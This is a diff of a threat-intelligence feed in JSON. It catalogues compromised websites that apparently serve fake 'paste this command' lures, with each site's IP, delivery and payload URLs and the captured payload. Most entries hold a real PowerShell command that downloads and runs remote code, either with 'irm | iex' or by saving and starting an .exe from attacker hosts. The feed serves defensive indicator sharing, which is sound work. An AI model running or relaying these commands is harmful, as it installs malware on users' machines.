@@ -1,5 +1,131 @@
 [
   {
+    "UrlDomain": "efi-lystfiskergrej.dk",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "45.77.67.62"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/nova-84e1-18b2b/5500-e4c4-44c7-84d6-987c6ab00aba/-/raw/main/abb8-52e04871081f?ref_type=heads | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/nova-84e1-18b2b/5500-e4c4-44c7-84d6-987c6ab00aba/-/raw/main/abb8-52e04871081f?ref_type=heads"
+    ],
+    "ReportId": "cmwv0xasy09ws0nmlu6n6b9bj",
+    "ScannedAt": "2026-11-24T18:24:09.780000+00:00"
+  },
+  {
+    "UrlDomain": "saludmagazine.co",
+    "DeliveryUrl": [
+      "img-codes-cloude.info",
+      "script.google.com",
+      "softify.lat"
+    ],
+    "PayloadUrl": [
+      "https://script.google.com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec",
+      "https://softify.lat/w/8ecec3ba"
+    ],
+    "IP": [
+      "77.37.83.73"
+    ],
+    "Related": [],
+    "Payload": "...' \"' + escapeCmdExeQuotedArg(APPS_SCRIPT_URL) + '\"'; // Wrap in cmd.exe /c \"...\" with CMD-style doubled quotes so paste works // in both CMD and PowerShell...",
+    "ResolvedDownloadUrl": [],
+    "ReportId": "cmwv0vfsi09qb0nmlg1r9m23j",
+    "ScannedAt": "2026-11-24T18:22:42.950000+00:00"
+  },
+  {
+    "UrlDomain": "maleon.rf.gd",
+    "DeliveryUrl": [
+      "cosmical2049.com"
+    ],
+    "PayloadUrl": [
+      "https://cosmical2049.com/startapv2/f9b9bfb54f8b30ec"
+    ],
+    "IP": [
+      "185.27.134.55"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://cosmical2049[.]com/startapv2/f9b9bfb54f8b30ec' -UserAgent 'WUA/b1d0126493' -Headers @{'X-WUA'='b1d0126493'})|iex",
+    "ResolvedDownloadUrl": [
+      "https://cosmical2049.com/startapv2/f9b9bfb54f8b30ec"
+    ],
+    "ReportId": "cmwv0uysm09pl0nml2qyjtgak",
+    "ScannedAt": "2026-11-24T18:22:20.923000+00:00"
+  },
+  {
+    "UrlDomain": "plantsathome.unaux.com",
+    "DeliveryUrl": [
+      "cosmical2049.com"
+    ],
+    "PayloadUrl": [
+      "https://cosmical2049.com/startapv2/f9b9bfb54f8b30ec"
+    ],
+    "IP": [
+      "185.27.134.100"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://cosmical2049[.]com/startapv2/f9b9bfb54f8b30ec' -UserAgent 'WUA/b1d0126493' -Headers @{'X-WUA'='b1d0126493'})|iex",
+    "ResolvedDownloadUrl": [
+      "https://cosmical2049.com/startapv2/f9b9bfb54f8b30ec"
+    ],
+    "ReportId": "cmwv0sxv609o70nml2djvoj24",
+    "ScannedAt": "2026-11-24T18:20:46.379000+00:00"
+  },
+  {
+    "UrlDomain": "akfloors.com",
+    "DeliveryUrl": [
+      "woodland-furniture.com"
+    ],
+    "PayloadUrl": [
+      "https://woodland-furniture.com"
+    ],
+    "IP": [
+      "50.87.150.150"
+    ],
+    "Related": [
+      {
+        "Value": "iture.com",
+        "Type": "Discovered"
+      }
+    ],
+    "Payload": "$p=\"$env:APPDATA\\uni2\\Beautifull.exe\"; New-Item (Split-Path $p) -ItemType Directory -Force | Out-Null; curl.exe -fsL -o \"$p\" \"https://woodland-furniture[.]com\"; if (Test-Path $p) { Start-Process $p }; exit",
+    "ResolvedDownloadUrl": [
+      "https://woodland-furniture.com"
+    ],
+    "ReportId": "cmwv0ke1j09ge0nml7qoagfb9",
+    "ScannedAt": "2026-11-24T18:14:07.462000+00:00"
+  },
+  {
+    "UrlDomain": "www.popularrelax.se",
+    "DeliveryUrl": [
+      "woodland-furniture.com"
+    ],
+    "PayloadUrl": [
+      "https://woodland-furniture.com"
+    ],
+    "IP": [
+      "77.111.240.177"
+    ],
+    "Related": [
+      {
+        "Value": "iture.com",
+        "Type": "Discovered"
+      }
+    ],
+    "Payload": "$p=\"$env:APPDATA\\uni2\\Beautifull.exe\"; New-Item (Split-Path $p) -ItemType Directory -Force | Out-Null; curl.exe -fsL -o \"$p\" \"https://woodland-furniture[.]com\"; if (Test-Path $p) { Start-Process $p }; exit",
+    "ResolvedDownloadUrl": [
+      "https://woodland-furniture.com"
+    ],
+    "ReportId": "cmwv06sn108z90nmllnm9vbl9",
+    "ScannedAt": "2026-11-24T18:03:33.186000+00:00"
+  },
+  {
     "UrlDomain": "www.antalya-flughafen-transfer.com",
     "DeliveryUrl": [],
     "PayloadUrl": [],
@@ -2777,196 +2903,5 @@
     ],
     "ReportId": "cmwpddiwu23050omlwlpexkd6",
     "ScannedAt": "2026-11-20T19:26:04.902000+00:00"
-  },
-  {
-    "UrlDomain": "andaluzia-design.com",
-    "DeliveryUrl": [
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/64c531dea7398e63"
-    ],
-    "IP": [
-      "146.59.209.152"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/64c531dea7398e63')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/64c531dea7398e63"
-    ],
-    "ReportId": "cmwpb5tna22tb0omlxa02r7uu",
-    "ScannedAt": "2026-11-20T18:24:06.578000+00:00"
-  },
-  {
-    "UrlDomain": "saint-maximin-au-coeur.fr",
-    "DeliveryUrl": [
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/a81feb0d517ad569"
-    ],
-    "IP": [
-      "51.91.236.255"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/a81feb0d517ad569')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/a81feb0d517ad569"
-    ],
-    "ReportId": "cmwpb5a4722so0oml24pnntoe",
-    "ScannedAt": "2026-11-20T18:23:41.241000+00:00"
-  },
-  {
-    "UrlDomain": "www.mfaa.it",
-    "DeliveryUrl": [
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/8718dba3c8e47827"
-    ],
-    "IP": [
-      "89.46.107.248"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/8718dba3c8e47827')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/8718dba3c8e47827"
-    ],
-    "ReportId": "cmwpb4wtl22rn0omlxja60ufu",
-    "ScannedAt": "2026-11-20T18:23:24.018000+00:00"
-  },
-  {
-    "UrlDomain": "manager-university.de",
-    "DeliveryUrl": [
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/a7a68d1534d986f1"
-    ],
-    "IP": [
-      "92.205.199.36"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/a7a68d1534d986f1')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/a7a68d1534d986f1"
-    ],
-    "ReportId": "cmwpb4dml22qi0omlny0uum8d",
-    "ScannedAt": "2026-11-20T18:22:59.132000+00:00"
-  },
-  {
-    "UrlDomain": "futureleadersincubator.org",
-    "DeliveryUrl": [
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/6889c497c888f0fe",
-      "https://platform.twitter.com/jot.html"
-    ],
-    "IP": [
-      "192.185.21.174"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/6889c497c888f0fe')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/6889c497c888f0fe"
-    ],
-    "ReportId": "cmwpb3u0022p60omljpi0kl8j",
-    "ScannedAt": "2026-11-20T18:22:33.714000+00:00"
-  },
-  {
-    "UrlDomain": "www.dormireamarsala.com",
-    "DeliveryUrl": [
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/aff7944081ac3ea9"
-    ],
-    "IP": [
-      "89.46.107.11"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/aff7944081ac3ea9')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/aff7944081ac3ea9"
-    ],
-    "ReportId": "cmwpb3nak22nm0omlq4s9yzvp",
-    "ScannedAt": "2026-11-20T18:22:24.996000+00:00"
-  },
-  {
-    "UrlDomain": "holtnow.com",
-    "DeliveryUrl": [
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/9430b97dfeaa939b"
-    ],
-    "IP": [
-      "104.21.80.8"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/9430b97dfeaa939b')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/9430b97dfeaa939b"
-    ],
-    "ReportId": "cmwpb2zg322mp0omlpb14eted",
-    "ScannedAt": "2026-11-20T18:21:54.089000+00:00"
-  },
-  {
-    "UrlDomain": "solenejansem.fr",
-    "DeliveryUrl": [
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/ad53dc245f3233fa"
-    ],
-    "IP": [
-      "37.187.142.61"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/ad53dc245f3233fa')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/ad53dc245f3233fa"
-    ],
-    "ReportId": "cmwpb2sso22lz0omlpc7jkg69",
-    "ScannedAt": "2026-11-20T18:21:45.491000+00:00"
-  },
-  {
-    "UrlDomain": "vivamossinviolencia.com",
-    "DeliveryUrl": [
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/081d30c2e8b12e71"
-    ],
-    "IP": [
-      "74.50.73.66"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/081d30c2e8b12e71')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/081d30c2e8b12e71"
-    ],
-    "ReportId": "cmwpb2fje22iu0oml5nlcwkff",
-    "ScannedAt": "2026-11-20T18:21:28.286000+00:00"
-  },
-  {
-    "UrlDomain": "myhelpper.com",
-    "DeliveryUrl": [
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/eb7996060e99801d"
-    ],
-    "IP": [
-      "192.185.213.26"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/eb7996060e99801d')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/eb7996060e99801d"
-    ],
-    "ReportId": "cmwpb2cbu22ik0omlvze25amh",
-    "ScannedAt": "2026-11-20T18:21:24.097000+00:00"
   }
 ]
